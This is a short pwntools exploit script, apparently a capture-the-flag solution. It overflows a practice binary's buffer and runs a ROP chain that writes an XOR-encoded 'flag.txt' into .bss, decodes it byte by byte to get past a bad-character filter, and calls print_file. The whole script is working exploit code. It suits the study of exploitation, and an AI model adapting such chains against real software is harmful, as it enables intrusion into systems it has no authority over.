from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain = padding

writeable_mem = 0x601038 #address of the .bss segment
xordstring = xor(b'flag.txt', b'\x02') # xor with 2

chain += p64(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret;
chain += xordstring    # r12 = xord flag.txt
chain += p64(writeable_mem) # r13 = writeable mem
chain += p64(1)
chain += p64(1)
chain += p64(0x400634) #mov qword ptr [r13], r12; ret;

for i in range(8): # loop through and xor back each char
  chain += p64(0x4006a0) # pop r14 pop r15 ret;  
  chain += p64(2) # want to xor each char back r14 = 2
  chain += p64(writeable_mem + i) # want to iterate over each char
  chain += p64(0x400628) # xor byte ptr [r15], r14b; ret; 

chain += p64(0x4006a3) # pop rdi; ret; 
chain += p64(writeable_mem) # RDI = writeable_mem
chain += p64(e.sym['print_file'])

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()

